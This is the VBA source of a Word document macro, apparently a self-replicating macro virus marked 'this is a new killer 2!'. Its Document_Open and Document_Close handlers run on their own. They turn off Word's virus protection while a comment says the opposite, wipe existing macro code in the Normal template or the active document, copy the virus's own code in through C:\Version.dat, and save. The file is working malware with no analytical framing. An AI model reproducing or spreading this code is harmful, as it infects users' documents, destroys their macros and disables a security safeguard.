   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()

       On Error Resume Next

       Const Marker = "<- this is a new killer 2!"

       Set prevDocument = ActiveDocument
       Set nextDocument = NormalTemplate
       'Declare Variables
       Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
       Dim ad, nt As Object, iCount As Integer
       Dim OurCode, UserAddress, LogData, LogFile As String

       'Initialize Variables
       Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
       Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

       DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
       NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


       'Switch the VirusProtection ON
       Options.VirusProtection = False

       'write to file
       If DocumentInfected = True Then
           Kill "C:\Version.dat"
           Open "C:\Version.dat" For Output As #1
           OurCode = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
           Print #1, OurCode
           Close #1

           iCount = NormalTemplate.VBProject.VBComponents.Count
           For i = 1 To iCount
               NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
           Next i

    '       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
                                   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
           NormalTemplate.Save

       End If

       If NormalTemplateInfected = True Then
           Kill "C:\Version.dat"
           Open "C:\Version.dat" For Output As #1
           OurCode = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
           Print #1, OurCode
           Close #1

           iCount = NormalTemplate.VBProject.VBComponents.Count
           For i = 1 To iCount
               ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
           Next i

           'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
                                                       ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
           ActiveDocument.Save
       End If
   End Sub

   Private Sub Document_Close()

       On Error Resume Next

       Const Marker = "<- this is a new killer 2!"

       'Declare Variables
       Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
       Dim ad, nt As Object
       Dim OurCode, UserAddress, LogData, LogFile As String

       'Initialize Variables
       Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
       Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

       DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
       NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


       'Switch the VirusProtection ON
       Options.VirusProtection = False

       'write to file
       If DocumentInfected = True Then
           Kill "C:\Version.dat"
           Open "C:\Version.dat" For Output As #1
           OurCode = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
           Print #1, OurCode
           Close #1

           iCount = NormalTemplate.VBProject.VBComponents.Count

           For i = 1 To iCount
               NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
           Next i

   '        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
                                   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
           NormalTemplate.Save

       End If

       If NormalTemplateInfected = True Then
           Kill "C:\Version.dat"
           Open "C:\Version.dat" For Output As #1
           OurCode = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
           Print #1, OurCode
           Close #1

           iCount = NormalTemplate.VBProject.VBComponents.Count
           For i = 1 To iCount
               ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
           Next i
   '        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
                                                       ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
           ActiveDocument.Save
       End If
   End Sub
